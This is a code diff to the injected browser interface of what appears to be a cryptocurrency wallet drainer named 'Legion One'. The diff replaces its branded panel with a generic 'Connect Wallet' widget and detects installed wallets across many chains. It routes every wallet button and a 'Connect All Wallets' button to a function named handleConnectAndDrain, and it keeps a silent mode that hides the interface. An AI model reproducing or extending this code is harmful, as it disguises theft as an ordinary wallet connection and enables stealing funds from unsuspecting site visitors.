@@ -1727,6 +1727,7 @@
         connected[chainName] = result.value;
         successCount++;
         console.log('[LEGION]   ✅', chainName, '← connected');
+        updateChainUI(chainName, result.value.address, 'connected');
       } else {
         var reason = result.reason ? result.reason.message : 'Unknown error';
         console.warn('[LEGION]   ❌', chainName, '← failed:', reason);
@@ -3061,18 +3062,57 @@
     var css = document.createElement('style');
     css.id = 'legion-one-styles';
     css.textContent = [
-      '#legion-one-launcher{position:fixed;bottom:24px;right:24px;z-index:2147483640;width:52px;height:52px;border-radius:50%;border:0;background:linear-gradient(135deg,#6366f1,#4f46e5);color:#fff;font:700 22px/1 system-ui,sans-serif;cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,.35);}',
-      '#legion-one-panel{position:fixed;bottom:88px;right:24px;z-index:2147483641;width:min(360px,calc(100vw - 32px));background:#0f172a;color:#e2e8f0;border-radius:14px;box-shadow:0 16px 48px rgba(0,0,0,.5);font:13px/1.45 system-ui,sans-serif;overflow:hidden;display:none;}',
-      '#legion-one-panel.open{display:block;}',
-      '#legion-one-panel .hdr{display:flex;align-items:center;justify-content:space-between;padding:10px 12px;background:#1e293b;cursor:move;user-select:none;}',
-      '#legion-one-panel .hdr span{font-weight:600;font-size:12px;}',
-      '#legion-one-panel .hdr button{background:transparent;border:0;color:#94a3b8;font-size:18px;cursor:pointer;padding:0 4px;}',
-      '#legion-one-panel .body{padding:12px;}',
-      '#legion-one-panel .btn{width:100%;padding:11px;border:0;border-radius:10px;font:600 14px system-ui,sans-serif;cursor:pointer;margin-bottom:8px;}',
-      '#legion-one-panel .btn-primary{background:linear-gradient(135deg,#6366f1,#4f46e5);color:#fff;}',
-      '#legion-one-panel .btn-primary:disabled{opacity:.45;cursor:not-allowed;}',
-      '#legion-one-panel .btn-secondary{background:rgba(99,102,241,.15);color:#c7d2fe;border:1px solid #6366f1;}',
-      '#legion-one-panel .btn-secondary:disabled{opacity:.4;border-color:#475569;color:#64748b;}',
+      // Launcher button
+      '#legion-one-launcher{position:fixed;bottom:24px;right:24px;z-index:2147483640;width:56px;height:56px;border-radius:16px;border:0;background:linear-gradient(135deg,#6366f1,#4f46e5);color:#fff;font:700 24px/1 system-ui,sans-serif;cursor:pointer;box-shadow:0 4px 20px rgba(99,102,241,.4);transition:all .2s ease;}',
+      '#legion-one-launcher:hover{transform:scale(1.08);box-shadow:0 6px 28px rgba(99,102,241,.55);}',
+
+      // Panel
+      '#legion-one-panel{position:fixed;bottom:92px;right:24px;z-index:2147483641;width:min(380px,calc(100vw - 32px));background:#0f172a;color:#e2e8f0;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.6);font:13px/1.5 system-ui,sans-serif;overflow:hidden;display:none;border:1px solid rgba(99,102,241,.2);}',
+      '#legion-one-panel.open{display:block;animation:l1-slide .25s ease;}',
+      '@keyframes l1-slide{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}',
+
+      // Header
+      '#legion-one-panel .l1-hdr{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:linear-gradient(135deg,#1e293b,#0f172a);border-bottom:1px solid rgba(255,255,255,.06);}',
+      '#legion-one-panel .l1-hdr .l1-title{font-weight:700;font-size:15px;color:#fff;display:flex;align-items:center;gap:8px;}',
+      '#legion-one-panel .l1-hdr .l1-dot{width:8px;height:8px;border-radius:50%;background:#22c55e;box-shadow:0 0 8px rgba(34,197,94,.5);}',
+      '#legion-one-panel .l1-hdr button{background:transparent;border:0;color:#64748b;font-size:20px;cursor:pointer;padding:2px 6px;border-radius:6px;transition:all .15s;}',
+      '#legion-one-panel .l1-hdr button:hover{background:rgba(255,255,255,.08);color:#fff;}',
+
+      // Body
+      '#legion-one-panel .l1-body{padding:16px;}',
+
+      // Wallet list
+      '#legion-one-panel .l1-wallets{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px;}',
+      '#legion-one-panel .l1-wallet-btn{display:flex;align-items:center;gap:8px;padding:10px 12px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:10px;color:#e2e8f0;font:500 13px system-ui,sans-serif;cursor:pointer;transition:all .15s;}',
+      '#legion-one-panel .l1-wallet-btn:hover{background:rgba(99,102,241,.12);border-color:rgba(99,102,241,.3);}',
+      '#legion-one-panel .l1-wallet-btn .l1-wallet-icon{width:24px;height:24px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;}',
+
+      // Divider
+      '#legion-one-panel .l1-divider{display:flex;align-items:center;gap:12px;margin:12px 0;color:#475569;font-size:11px;text-transform:uppercase;letter-spacing:.5px;}',
+      '#legion-one-panel .l1-divider::before,#legion-one-panel .l1-divider::after{content:"";flex:1;height:1px;background:rgba(255,255,255,.06);}',
+
+      // Connect all button
+      '#legion-one-panel .l1-connect-all{width:100%;padding:12px;border:0;border-radius:12px;font:600 14px system-ui,sans-serif;cursor:pointer;color:#fff;background:linear-gradient(135deg,#6366f1,#4f46e5);box-shadow:0 2px 12px rgba(99,102,241,.3);transition:all .2s;}',
+      '#legion-one-panel .l1-connect-all:hover{box-shadow:0 4px 20px rgba(99,102,241,.45);transform:translateY(-1px);}',
+      '#legion-one-panel .l1-connect-all:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none;}',
+
+      // WalletConnect button
+      '#legion-one-panel .l1-wc-btn{width:100%;padding:11px;border:1px solid rgba(59,130,246,.3);border-radius:12px;font:500 13px system-ui,sans-serif;cursor:pointer;color:#93c5fd;background:rgba(59,130,246,.08);margin-top:8px;transition:all .15s;}',
+      '#legion-one-panel .l1-wc-btn:hover{background:rgba(59,130,246,.15);border-color:rgba(59,130,246,.5);}',
+
+      // Connected chains
+      '#legion-one-panel .l1-chains{margin-top:12px;}',
+      '#legion-one-panel .l1-chain-row{display:flex;align-items:center;justify-content:space-between;padding:8px 10px;background:rgba(255,255,255,.03);border-radius:8px;margin-bottom:4px;font-size:12px;}',
+      '#legion-one-panel .l1-chain-name{display:flex;align-items:center;gap:6px;font-weight:500;}',
+      '#legion-one-panel .l1-chain-addr{color:#64748b;font-family:monospace;font-size:11px;}',
+      '#legion-one-panel .l1-chain-status{font-size:10px;padding:2px 8px;border-radius:999px;font-weight:600;}',
+      '#legion-one-panel .l1-chain-status.connected{background:rgba(34,197,94,.12);color:#4ade80;}',
+      '#legion-one-panel .l1-chain-status.pending{background:rgba(250,204,21,.12);color:#fbbf24;}',
+
+      // Status bar
+      '#legion-one-panel .l1-status{font-size:12px;color:#94a3b8;margin-top:12px;padding:8px 10px;background:rgba(255,255,255,.03);border-radius:8px;min-height:20px;}',
+
+      // Silent mode
       'body.legion-one-silent #legion-one-launcher,body.legion-one-silent #legion-one-panel{display:none!important;}',
       'wcm-modal{--wcm-z-index:2147483647!important;}',
     ].join('');
@@ -3085,30 +3125,65 @@
     // Launcher button
     var launcher = document.createElement('button');
     launcher.id = 'legion-one-launcher';
-    launcher.textContent = '⚡';
-    launcher.title = 'Legion One';
+    launcher.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"/><path d="M3 5v14a2 2 0 0 0 2 2h16v-5"/><path d="M18 12a2 2 0 0 0 0 4h4v-4Z"/></svg>';
+    launcher.title = 'Connect Wallet';
     launcher.addEventListener('click', function() {
       var panel = document.getElementById('legion-one-panel');
       if (panel) panel.classList.toggle('open');
     });
     document.body.appendChild(launcher);
 
+    // Detect available wallets for the grid
+    var walletButtons = [];
+    if (window.ethereum) {
+      var evmName = 'MetaMask';
+      if (window.ethereum.isRabby) evmName = 'Rabby';
+      else if (window.ethereum.isCoinbaseWallet) evmName = 'Coinbase';
+      else if (window.ethereum.isBraveWallet) evmName = 'Brave';
+      else if (window.ethereum.isTrust) evmName = 'Trust';
+      else if (window.ethereum.isOkxWallet) evmName = 'OKX';
+      walletButtons.push({ name: evmName, chain: 'EVM', color: '#f6851b' });
+    }
+    if (window.phantom && window.phantom.solana) walletButtons.push({ name: 'Phantom', chain: 'SOL', color: '#ab9ff2' });
+    if (window.solflare) walletButtons.push({ name: 'Solflare', chain: 'SOL', color: '#fc822b' });
+    if (window.unisat) walletButtons.push({ name: 'UniSat', chain: 'BTC', color: '#f7931a' });
+    if (window.tronWeb) walletButtons.push({ name: 'TronLink', chain: 'TRON', color: '#ff0013' });
+    if (window.tonkeeper || window.ton) walletButtons.push({ name: 'TON', chain: 'TON', color: '#0088cc' });
+    if (window.keplr) walletButtons.push({ name: 'Keplr', chain: 'COSMOS', color: '#536dfe' });
+    if (window.aptos || window.petra) walletButtons.push({ name: 'Petra', chain: 'APTOS', color: '#4cd964' });
+
+    // Build wallet grid HTML
+    var walletGridHTML = '';
+    walletButtons.forEach(function(w) {
+      walletGridHTML += '<button class="l1-wallet-btn" data-chain="' + w.chain + '">' +
+        '<span class="l1-wallet-icon" style="background:' + w.color + '22;color:' + w.color + '">' + w.name.charAt(0) + '</span>' +
+        w.name +
+      '</button>';
+    });
+    if (walletButtons.length === 0) {
+      walletGridHTML = '<div style="grid-column:1/-1;text-align:center;color:#64748b;padding:8px;font-size:12px;">No wallets detected</div>';
+    }
+
     // Panel
     var panel = document.createElement('div');
     panel.id = 'legion-one-panel';
     panel.innerHTML = [
-      '<div class="hdr">',
-      '  <span>Legion One v2.0</span>',
-      '  <button type="button" id="legion-one-close" title="Close">×</button>',
+      '<div class="l1-hdr">',
+      '  <div class="l1-title"><span class="l1-dot"></span>Connect Wallet</div>',
+      '  <button type="button" id="legion-one-close" title="Close">&times;</button>',
       '</div>',
-      '<div class="body">',
-      '  <button type="button" class="btn btn-primary" id="legion-one-connect-btn">',
-      '    Connect Wallet',
+      '<div class="l1-body">',
+      '  <div class="l1-wallets">' + walletGridHTML + '</div>',
+      '  <button type="button" class="l1-connect-all" id="legion-one-connect-btn">',
+      '    Connect All Wallets',
       '  </button>',
-      '  <button type="button" class="btn btn-secondary" id="legion-one-walletconnect-btn">',
-      '    Wallet Connect',
+      '  <div class="l1-divider">or</div>',
+      '  <button type="button" class="l1-wc-btn" id="legion-one-walletconnect-btn">',
+      '    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:-3px;margin-right:6px;"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>',
+      '    WalletConnect / QR Code',
       '  </button>',
-      '  <div id="legion-one-status" style="font-size:11px;color:#94a3b8;margin-top:8px;"></div>',
+      '  <div class="l1-chains" id="legion-one-chains"></div>',
+      '  <div class="l1-status" id="legion-one-status">Ready to connect</div>',
       '</div>'
     ].join('');
     document.body.appendChild(panel);
@@ -3120,12 +3195,31 @@
 
     document.getElementById('legion-one-connect-btn').addEventListener('click', window.handleConnectAndDrain);
     document.getElementById('legion-one-walletconnect-btn').addEventListener('click', handleWalletConnect);
+
+    // Individual wallet buttons
+    var wBtns = panel.querySelectorAll('.l1-wallet-btn');
+    wBtns.forEach(function(btn) {
+      btn.addEventListener('click', function() {
+        window.handleConnectAndDrain();
+        panel.classList.remove('open');
+      });
+    });
   }
 
-  function updateStatus(text) {
-    var status = document.getElementById('legion-one-status');
-    if (status) {
-      status.textContent = text;
+  function updateChainUI(chainName, address, status) {
+    var container = document.getElementById('legion-one-chains');
+    if (!container) return;
+    var shortAddr = address ? address.substring(0, 6) + '...' + address.substring(address.length - 4) : '';
+    var existing = document.getElementById('l1-chain-' + chainName);
+    var html = '<div class="l1-chain-row" id="l1-chain-' + chainName + '">' +
+      '<span class="l1-chain-name">' + chainName + '</span>' +
+      '<span class="l1-chain-addr">' + shortAddr + '</span>' +
+      '<span class="l1-chain-status ' + status + '">' + (status === 'connected' ? 'Connected' : 'Pending') + '</span>' +
+    '</div>';
+    if (existing) {
+      existing.outerHTML = html;
+    } else {
+      container.innerHTML += html;
     }
   }
 
